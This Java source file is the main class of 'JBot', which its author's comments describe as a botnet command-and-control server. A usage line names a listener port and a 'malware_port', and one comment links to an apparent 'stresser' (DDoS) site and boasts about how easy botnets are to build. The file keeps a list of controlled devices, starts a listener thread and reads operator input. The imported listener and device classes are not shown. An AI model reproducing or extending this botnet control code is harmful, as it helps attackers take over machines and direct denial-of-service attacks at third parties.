package me.aaronakhtar.jbot;

import me.aaronakhtar.jbot.objects.Device;
import me.aaronakhtar.jbot.threads.Listener;
import me.aaronakhtar.jbot.utils.Terminal;

import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

/**
 * Developed by Aaron Akhtar.
 *
 * @author Aaron Akhtar
 * <p>
 * Check me out:
 * contact@aaronakhtar.me
 * https://stressing.ninja
 * <p>
 * Making this was too easy, and you wonder why
 * botnet attacks are so fucking popular now a days...
 */
public class JBot {

    public static List<Device> devices = new ArrayList<>();
    public static List<Thread> threads = new ArrayList<>();

    public static final boolean isUnderDev = true;

    // Threads
    private static final Thread listener = new Listener();

    public static final boolean allowMultipleInstances = false;

    // cnc arguments: java -jar ... <listener_port> <malware_port>

    public static void main(String[] args) throws InterruptedException {
        Terminal.clearScreen();
        listener.start();
        threads.add(listener);
        Thread.sleep(500);
        Input.get();
    }

}
